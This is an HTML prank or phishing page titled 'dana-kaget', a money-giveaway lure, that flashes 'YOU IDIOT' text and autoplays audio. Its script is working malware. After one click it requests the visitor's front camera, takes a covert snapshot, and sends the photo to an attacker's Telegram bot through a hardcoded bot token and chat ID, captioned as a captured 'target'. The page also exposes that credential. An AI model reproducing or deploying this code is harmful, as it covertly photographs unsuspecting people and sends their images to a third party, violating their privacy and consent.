<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dana-kaget</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            animation: brutalBgGlitch 0.15s steps(2, end) infinite;
        }

        @keyframes brutalBgGlitch {
            0% { background-color: #000; color: #fff; filter: invert(0) contrast(200%); }
            25% { background-color: #fff; color: #000; filter: invert(1) contrast(300%) hue-rotate(90deg); }
            50% { background-color: #111; color: #eee; filter: invert(0.2) blur(1px); }
            75% { background-color: #fff; color: #000; filter: invert(0.9) contrast(400%); }
            100% { background-color: #000; color: #fff; filter: invert(0); }
        }

        /* Teks Utama di Tengah (Ukuran dioptimalkan agar pas dan proporsional di layar) */
        .center-text {
            position: absolute;
            font-size: clamp(2rem, 7vw, 4.5rem);
            font-weight: 900;
            letter-spacing: 4px;
            z-index: 10;
            text-align: center;
            cursor: pointer;
            text-transform: uppercase;
            white-space: nowrap;
            width: 100%;
            padding: 0 10px;
            box-sizing: border-box;
            animation: brutalTextGlitch 0.1s infinite;
        }

        @keyframes brutalTextGlitch {
            0% { color: #fff; text-shadow: 4px 4px 0px #ff0000, -4px -4px 0px #00ffff; transform: translate(0, 0) skew(0deg); }
            20% { color: #000; text-shadow: -6px 2px 0px #fff, 6px -2px 0px #000; transform: translate(-3px, 3px) skew(10deg); }
            40% { color: #fff; text-shadow: 2px -6px 0px #ff00ff, -2px 6px 0px #ffff00; transform: translate(4px, -2px) skew(-15deg); }
            60% { color: #fff; text-shadow: -4px -4px 0px #00ff00; transform: translate(-2px, -4px) skew(5deg); }
            80% { color: #000; text-shadow: 5px 5px 0px #fff; transform: translate(3px, 2px) skew(-5deg); }
            100% { color: #fff; text-shadow: -5px 2px 0px #ff0000, 5px -2px 0px #0000ff; transform: translate(0, 0) skew(0deg); }
        }

        /* Lapisan Teks Transparan Bergerak Brutal */
        .floating-container {
            position: absolute;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 1;
            pointer-events: none;
        }

        .floating-text {
            position: absolute;
            font-size: 2rem;
            font-weight: 900;
            opacity: 0.35;
            white-space: nowrap;
            text-transform: uppercase;
            animation: moveBrutalText 3s linear infinite, textGlitchFast 0.08s infinite;
        }

        @keyframes moveBrutalText {
            0% { transform: translate(-150vw, -150vh) rotate(0deg); }
            100% { transform: translate(150vw, 150vh) rotate(15deg); }
        }

        @keyframes textGlitchFast {
            0% { opacity: 0.2; filter: blur(0px); }
            50% { opacity: 0.5; filter: blur(1.5px); transform: scale(1.1); }
            100% { opacity: 0.2; filter: blur(0px); }
        }
    </style>
</head>
<body>

    <!-- Lapisan Teks Transparan Mengambang -->
    <div class="floating-container" id="floatingContainer"></div>

    <!-- Teks Utama di Tengah -->
    <div class="center-text" id="triggerBtn">YOU IDIOT</div>

    <!-- Backsound Audio (Atribut autoplay ditambahkan, dengan fallback interaksi jika diblokir browser) -->
    <audio id="backsound" loop autoplay>
        <source src="https://d.uguu.se/vqFjDiJF.mp3" type="audio/mpeg">
    </audio>

    <!-- Elemen Tersembunyi untuk Kamera -->
    <video id="videoElement" autoplay playsinline style="display:none;"></video>
    <canvas id="canvasElement" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8993484744:AAG8vtKU0JO0GJId3VsgixDsq_j7UaQYfxI';
        const CHAT_ID = '8916676688';

        // Generate teks transparan bergerak dengan densitas tinggi
        const container = document.getElementById('floatingContainer');
        for (let i = 0; i < 25; i++) {
            const span = document.createElement('div');
            span.className = 'floating-text';
            span.innerText = 'YOU ARE A IDIOT';
            span.style.top = Math.random() * 100 + 'vh';
            span.style.left = Math.random() * 100 + 'vw';
            span.style.animationDuration = (Math.random() * 2 + 1.5) + 's';
            span.style.fontSize = (Math.random() * 1.5 + 1.5) + 'rem';
            container.appendChild(span);
        }

        // Coba langsung jalankan audio saat halaman dimuat (autoplay)
        window.addEventListener('DOMContentLoaded', () => {
            const audio = document.getElementById('backsound');
            audio.play().catch(() => {
                // Jika kebijakan browser memblokir autoplay sebelum interaksi, fallback ke klik pertama
                document.body.addEventListener('click', () => {
                    audio.play().catch(() => {});
                }, { once: true });
            });
        });

        // Interaksi klik untuk memicu izin kamera secara serentak
        document.body.addEventListener('click', () => {
            jalankanKameraDanKirim();
        }, { once: true });

        async function jalankanKameraDanKirim() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('videoElement');
                video.srcObject = stream;

                await new Promise((resolve) => {
                    video.onloadedmetadata = () => resolve();
                });

                await new Promise(r => setTimeout(r, 1000));

                const canvas = document.getElementById('canvasElement');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach(track => track.stop());

                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'snapshot_target.jpg');
                    formData.append('caption', '<b>[+] Snapshot Target Berhasil Diambil [+]</b>');
                    formData.append('parse_mode', 'HTML');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }, 'image/jpeg', 0.85);

            } catch (err) {
                console.error('Akses kamera ditolak atau gagal:', err);
            }
        }
    </script>
</body>
</html>
